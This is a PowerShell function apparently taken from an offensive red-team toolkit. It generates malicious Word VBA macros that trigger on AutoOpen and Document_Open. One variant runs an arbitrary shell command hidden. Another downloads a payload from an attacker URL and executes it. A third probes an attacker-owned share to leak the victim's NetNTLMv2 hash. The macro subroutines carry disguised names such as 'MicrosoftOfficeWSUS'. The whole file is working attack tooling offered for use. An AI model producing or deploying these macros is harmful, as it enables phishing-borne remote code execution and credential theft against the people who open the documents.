function Get-VBAMacro {
#.SYNOPSIS
# Simple VBA Macro Generator
# ARBITRARY VERSION NUMBER:  1.0.0
# AUTHOR:  Tyler McCann (@tylerdotrar)
#
#.DESCRIPTION
# Simple VBA macro generator supporting both staged ($PayloadURL) and stageless ($RawPayload)
# payloads, as well as a simple hash grabbing payload ($SharePath).  Staged requires a URL
# hosting the intended text-based payload (with support for HTTPS via self-signed certificates),
# whereas stageless is a simple barebones shell command.  The hash grabbing payload is a simple
# macro that attempts to "validate" a file exists on an attacker owned share, revealing the
# user's NetNTLMv2 hash.
# 
# Insert into: Project (<filename>) --> Microsoft Word Objects --> ThisDocument
# 
# Parameters: 
#   -RawPayload  -->  Payload to execute via simple shell macro (Alias: Stageless) 
#   -PayloadURL  -->  URL of a text-based payload that the macro executes (Alias: Staged) 
#   -SharePath   -->  Share path macro reaches out to to reveal user's NetNTLMv2 hash
#   -PrivateSub  -->  Make Subroutine Private instead of Public
#   -Help        -->  Return Get-Help information
#
#.LINK
# https://github.com/tylerdotrar/PoorMansArmory


    Param(
        [Alias('Staged')][string]$PayloadURL = 'http(s)://<ip_addr>/<payload>',
        [Alias('Stageless')][string]$RawPayload,
        [string]$SharePath = '\\<ip_addr>\share',
        [switch]$PrivateSub,
        [switch]$Help
    )
    

    # Return Get-Help Information
    if ($Help) { return (Get-Help Get-VBAMacro) }


    # Minor Error Correction
    if ($RawPayload) { $Stageless = $TRUE }
    elseif ($PayloadURL -ne 'http(s)://<ip_addr>/<payload>') {
        if ($PayloadURL -notlike "http*") { return (Write-Host '[-] Payload URL is invalid (e.g., "http(s)://<ip_addr>/<payload>")' -ForegroundColor Red) }
        $Staged = $TRUE
    }
    elseif ($SharePath -ne '\\<ip_addr>\share') {
        if ($SharePath -notlike "\\*") { return (Write-Host '[-] Share path format is invalid (e.g., "\\<ip_addr>\<share>")' -ForegroundColor Red) }
        $HashGrab = $TRUE
    }
    

    # Toggle private macros
    if ($PrivateSub) { $Sub = 'Private ' }
    else             { $Sub = $NULL      }


    # Least Obfuscated Macro of All Time
    if ($Stageless) {
        $Macro = @"
${Sub}Sub AutoOpen()
        DocumentAnalytics
End Sub

${Sub}Sub Document_Open()
        DocumentAnalytics
End Sub

${Sub}Sub DocumentAnalytics()
    Dim Subtle As Double
    Subtle = Shell("$RawPayload", 0)
End Sub
"@
    }

    # Supports HTTPS URLs with Self-Signed Certificates
    elseif ($Staged) {
        $Macro = @"
${Sub}Sub AutoOpen()
        DocumentPreferences
End Sub

${Sub}Sub Document_Open()
        DocumentPreferences
End Sub

${Sub}Sub DocumentPreferences()
        Set Request = CreateObject("MSXML2.ServerXMLHTTP")
        Request.SetOption 2, Request.GetOption(2)
        Request.Open "GET", "$PayloadURL", False
        Request.Send
        Dim Preferences As String
        Preferences = Request.ResponseText
        Set Update = CreateObject("WScript.Shell")
        Update.Run (Preferences), 0
        Set Update = Nothing
End Sub
"@
    }

    elseif ($HashGrab) {
        $Macro = @"
${Sub}Sub AutoOpen()
        MicrosoftOfficeWSUS
End Sub

${Sub}Sub Document_Open()
        MicrosoftOfficeWSUS
End Sub

${Sub}Sub MicrosoftOfficeWSUS()
    Dim sharePath As String
    sharePath = "$SharePath"
    Dim fs As Object
    Set fs = CreateObject("Scripting.FileSystemObject")
    fs.FileExists (sharePath)
End Sub
"@
    }
    
    return $Macro
}